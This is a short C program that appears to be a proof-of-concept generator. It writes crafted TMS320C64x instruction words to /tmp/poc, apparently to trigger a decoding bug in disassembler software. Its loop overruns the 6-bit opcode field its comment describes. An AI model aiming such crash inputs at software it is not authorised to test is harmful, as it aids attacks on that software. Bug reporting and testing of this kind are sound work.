#include <stdio.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* TMS320C64x instructions are 32-bit (4 bytes) */
    /* Try placing 0x7E (126) at bits 6-12 (7-bit field) */
    /* This creates instruction: 0x00001F80 where bits 6-12 = 0x7E */
    
    for (int opcode = 0; opcode < 256; opcode++) {
        unsigned int instr = 0;
        /* Place 0x7E at bits 6-12 */
        instr |= (126 << 6);
        /* Add varying opcode at bits 26-31 */
        instr |= (opcode << 26);
        
        /* Write in little-endian */
        fputc(instr & 0xFF, f);
        fputc((instr >> 8) & 0xFF, f);
        fputc((instr >> 16) & 0xFF, f);
        fputc((instr >> 24) & 0xFF, f);
    }

    fclose(f);
    return 0;
}